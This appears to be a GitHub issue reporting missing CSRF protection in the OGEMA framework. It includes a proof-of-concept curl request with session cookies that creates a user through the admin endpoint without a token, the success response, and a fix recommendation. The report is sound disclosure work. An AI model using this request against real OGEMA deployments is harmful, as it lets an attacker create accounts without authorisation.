 URL : "https://github.com/ogema/ogema/issues/13" TITLE : missing csrf protection BODY : no csrf protection is present in ogema framework. it is possible to trick an admin and create users e.g in background with an iframe. poc: ------------------------------------------------------------- request: curl --insecure 'https://127.0.0.1:8443/apps/ogema/frameworkadminuser/createuser?user=\ 5\ _class%20org.ogema.frameworkadministration.frameworkadministration@43' -h 'content-type: application/json; charset=utf-8' -h 'cookie: jsessionid=1kdqojxgzfwe1dil5ikduxlo--1; jsessionid=1kdqojxgzfwe1dil5ikduxlo--1; jsessionid=1kdqojxgzfwe1dil5ikduxlo' --data $'{ user : test , isnatural : true, pwd : test }' response: { type : ok , message : user successfully created } to create a user no csrf-token pw=98393a09d05b685c is required. ------------------------------------------------------------- solution: implement csrf token for each crud request. https://www.owasp.org/index.php/cross-site_request_forgery_ csrf _prevention_cheat_sheet
